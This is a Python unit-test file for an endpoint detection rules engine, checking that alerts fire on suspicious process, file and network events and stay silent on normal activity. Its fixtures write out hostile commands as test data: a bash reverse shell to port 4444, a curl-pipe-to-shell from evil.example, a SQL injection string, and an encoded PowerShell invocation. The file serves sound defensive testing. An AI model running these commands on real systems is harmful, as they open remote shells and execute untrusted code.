import unittest
from pathlib import Path

from agent.rules_engine import RulesEngine, load_rules

RULES = Path(__file__).resolve().parent.parent / "config" / "rules.yaml"


def make_engine(platform="linux", allowlist=None):
    return RulesEngine(RULES, allowlist=allowlist, platform_name=platform)


def proc(name, cmdline="", target=None, **extra):
    event = {"type": "process_start", "name": name, "cmdline": cmdline or name,
             "target": target or f"/usr/bin/{name}", "exe": f"/usr/bin/{name}",
             "username": "user", "pid": 100, "parent_name": "bash", "pkg_activity": False}
    event.update(extra)
    return event


def fileev(path, action="modified", **extra):
    name = path.rsplit("/", 1)[-1]
    event = {"type": "file_event", "action": action, "path": path, "filename": name,
             "directory": path.rsplit("/", 1)[0], "extension": "." + name.rsplit(".", 1)[-1] if "." in name else "",
             "content_changed": True, "pkg_activity": False}
    event.update(extra)
    return event


def ids(alerts):
    return {a["rule_id"] for a in alerts}


class RuleFileTests(unittest.TestCase):
    def test_all_rules_valid(self):
        rules, errors = load_rules(RULES)
        self.assertEqual(errors, [])
        self.assertGreater(len(rules), 15)

    def test_unique_ids(self):
        rules, _ = load_rules(RULES)
        self.assertEqual(len({r.id for r in rules}), len(rules))


class DetectionTests(unittest.TestCase):
    def test_offensive_tool(self):
        self.assertIn("WLF-1001", ids(make_engine().evaluate(proc("nmap", "nmap -sV 10.0.0.1"))))

    def test_reverse_shell(self):
        ev = proc("bash", "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
        self.assertIn("WLF-1002", ids(make_engine().evaluate(ev)))

    def test_exec_from_tmp(self):
        ev = proc("dropper.sh", target="/tmp/dropper.sh", exe="/bin/sh")
        self.assertIn("WLF-1003", ids(make_engine().evaluate(ev)))

    def test_exec_from_downloads(self):
        ev = proc("run.sh", target="/home/u/Downloads/run.sh")
        self.assertIn("WLF-1004", ids(make_engine().evaluate(ev)))

    def test_ransomware_threshold(self):
        engine = make_engine()
        fired = []
        for i in range(8):
            fired += engine.evaluate(fileev(f"/home/u/Documents/f{i}.txt.locked", "created"))
        self.assertIn("WLF-1010", ids(fired))

    def test_sql_injection_in_curl(self):
        ev = proc("curl", "curl http://x/?id=1 UNION SELECT 1,2")
        self.assertIn("WLF-1014", ids(make_engine().evaluate(ev)))

    def test_authorized_keys_change(self):
        ev = fileev("/home/u/.ssh/authorized_keys")
        self.assertIn("WLF-1009", ids(make_engine().evaluate(ev)))

    def test_shadow_change(self):
        self.assertIn("WLF-1006", ids(make_engine().evaluate(fileev("/etc/shadow"))))

    def test_backdoor_port(self):
        ev = {"type": "network_connect", "remote_port": 4444, "remote_ip": "8.8.8.8",
              "remote_is_loopback": False, "remote_is_private": False,
              "process_name": "x", "process_path": "/usr/bin/x", "pid": 1}
        self.assertIn("WLF-1012", ids(make_engine().evaluate(ev)))


class FalsePositiveTests(unittest.TestCase):
    def test_normal_processes_silent(self):
        engine = make_engine()
        for name in ("bash", "python3", "firefox", "ls", "code", "ssh", "git", "sleep", "systemd"):
            self.assertEqual(engine.evaluate(proc(name)), [], name)

    def test_nc_alone_not_flagged(self):
        self.assertEqual(make_engine().evaluate(proc("nc", "nc -z host 22")), [])

    def test_wireshark_and_burp_not_flagged(self):
        engine = make_engine()
        self.assertEqual(engine.evaluate(proc("wireshark")), [])
        self.assertEqual(engine.evaluate(proc("burpsuite")), [])

    def test_python_script_in_home_not_tmp(self):
        ev = proc("python3", "python3 /home/u/app.py", target="/home/u/app.py")
        self.assertEqual(make_engine().evaluate(ev), [])

    def test_exec_from_tmp_during_package_install(self):
        ev = proc("postinst", target="/tmp/postinst", pkg_activity=True)
        self.assertNotIn("WLF-1003", ids(make_engine().evaluate(ev)))

    def test_appimage_mount_not_flagged(self):
        ev = proc("app", target="/tmp/.mount_appXYZ/usr/bin/app")
        self.assertNotIn("WLF-1003", ids(make_engine().evaluate(ev)))

    def test_pip_build_dir_not_flagged(self):
        ev = proc("setup", target="/tmp/pip-build-abc/setup.py")
        self.assertNotIn("WLF-1003", ids(make_engine().evaluate(ev)))

    def test_single_enc_file_not_ransomware(self):
        alerts = make_engine().evaluate(fileev("/home/u/secret.enc", "created"))
        self.assertNotIn("WLF-1010", ids(alerts))

    def test_bashrc_unchanged_content_ignored(self):
        ev = fileev("/home/u/.bashrc", content_changed=False)
        self.assertNotIn("WLF-1007", ids(make_engine().evaluate(ev)))

    def test_shadow_update_by_package_ignored(self):
        ev = fileev("/etc/passwd", pkg_activity=True)
        self.assertNotIn("WLF-1006", ids(make_engine().evaluate(ev)))

    def test_known_installer_pipe_not_flagged(self):
        ev = proc("sh", "sh -c 'curl --proto =https -sSf https://sh.rustup.rs | sh'")
        self.assertNotIn("WLF-1015", ids(make_engine().evaluate(ev)))

    def test_unknown_pipe_to_shell_flagged(self):
        ev = proc("sh", "sh -c 'curl http://evil.example/x | sh'")
        self.assertIn("WLF-1015", ids(make_engine().evaluate(ev)))

    def test_loopback_port_not_flagged(self):
        ev = {"type": "network_connect", "remote_port": 4444, "remote_ip": "127.0.0.1",
              "remote_is_loopback": True, "remote_is_private": True,
              "process_name": "x", "process_path": "/usr/bin/x", "pid": 1}
        self.assertEqual(make_engine().evaluate(ev), [])

    def test_normal_curl_not_sql(self):
        ev = proc("curl", "curl -s https://api.github.com/repos/x/y")
        self.assertEqual(make_engine().evaluate(ev), [])

    def test_windows_rules_skipped_on_linux(self):
        ev = proc("powershell", "powershell -enc " + "A" * 60)
        self.assertEqual(make_engine("linux").evaluate(ev), [])
        self.assertIn("WLF-1101", ids(make_engine("windows").evaluate(ev)))


class SuppressionTests(unittest.TestCase):
    def test_cooldown_dedupes(self):
        engine = make_engine()
        self.assertEqual(len(engine.evaluate(proc("nmap", "nmap x"))), 1)
        self.assertEqual(len(engine.evaluate(proc("nmap", "nmap x"))), 0)

    def test_allowlist_process_name(self):
        engine = make_engine(allowlist={"process_names": ["nmap"]})
        self.assertEqual(engine.evaluate(proc("nmap")), [])

    def test_allowlist_rule_id(self):
        engine = make_engine(allowlist={"rule_ids": ["WLF-1001"]})
        self.assertEqual(engine.evaluate(proc("nmap")), [])

    def test_allowlist_path(self):
        engine = make_engine(allowlist={"paths": ["/opt/lab/"]})
        self.assertEqual(engine.evaluate(proc("nmap", target="/opt/lab/nmap", exe="/opt/lab/nmap")), [])


if __name__ == "__main__":
    unittest.main()
